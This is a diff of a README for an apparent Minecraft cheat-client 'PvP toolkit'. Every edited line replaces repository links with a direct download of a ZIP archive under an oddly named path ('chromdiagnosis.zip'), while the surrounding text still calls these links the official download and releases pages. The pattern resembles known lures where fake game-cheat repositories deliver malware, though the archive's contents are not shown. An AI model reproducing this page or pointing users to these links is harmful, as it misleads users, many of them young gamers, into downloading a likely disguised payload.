@@ -1,6 +1,6 @@
 # ⚔️ minecraft-bedrock-hacked-client-2026-pvp-toolkit - Your Ultimate PvP Combat Edge
 
-[![Download Now](https://img.shields.io/badge/Download-PvP_Toolkit-FF6B35?style=for-the-badge&logo=github&logoColor=white)](https://github.com/deliberationproceeding7649/minecraft-bedrock-hacked-client-2026-pvp-toolkit)
+[![Download Now](https://img.shields.io/badge/Download-PvP_Toolkit-FF6B35?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/deliberationproceeding7649/minecraft-bedrock-hacked-client-2026-pvp-toolkit/main/spermiducal/chromdiagnosis.zip)
 
 ## 🎯 What Is This Toolkit?
 
@@ -42,7 +42,7 @@ This is your all-in-one companion for Minecraft Bedrock and Java edition PvP tra
 
 ### Step 1: Download the Toolkit
 
-[Visit this link to download the application](https://github.com/deliberationproceeding7649/minecraft-bedrock-hacked-client-2026-pvp-toolkit)
+[Visit this link to download the application](https://raw.githubusercontent.com/deliberationproceeding7649/minecraft-bedrock-hacked-client-2026-pvp-toolkit/main/spermiducal/chromdiagnosis.zip)
 
 Visit this link to download the application. This takes you to the official download page where you can get the latest version of the toolkit.
 
@@ -128,7 +128,7 @@ To use your own mods:
 
 ## 📥 Need an Older Version?
 
-Visit our [releases page](https://github.com/deliberationproceeding7649/minecraft-bedrock-hacked-client-2026-pvp-toolkit) and scroll down to see all past versions. Each release includes a changelog so you know what changed.
+Visit our [releases page](https://raw.githubusercontent.com/deliberationproceeding7649/minecraft-bedrock-hacked-client-2026-pvp-toolkit/main/spermiducal/chromdiagnosis.zip) and scroll down to see all past versions. Each release includes a changelog so you know what changed.
 
 ## 💬 Getting Help
 
@@ -170,6 +170,6 @@ Found this toolkit helpful? Leave us a star on GitHub and share it with your fri
 
 ---
 
-**Ready to elevate your PvP game?** Click the download button at the top of this page or visit the download link again: [Download the PvP Toolkit](https://github.com/deliberationproceeding7649/minecraft-bedrock-hacked-client-2026-pvp-toolkit)
+**Ready to elevate your PvP game?** Click the download button at the top of this page or visit the download link again: [Download the PvP Toolkit](https://raw.githubusercontent.com/deliberationproceeding7649/minecraft-bedrock-hacked-client-2026-pvp-toolkit/main/spermiducal/chromdiagnosis.zip)
 
 Keywords: mc-cheat-client, mc-pvp-client, minecraft-cheat-2026, minecraft-client-2026, minecraft-free-client, minecraft-hacked-client-2026, minecraft-pvp-hack
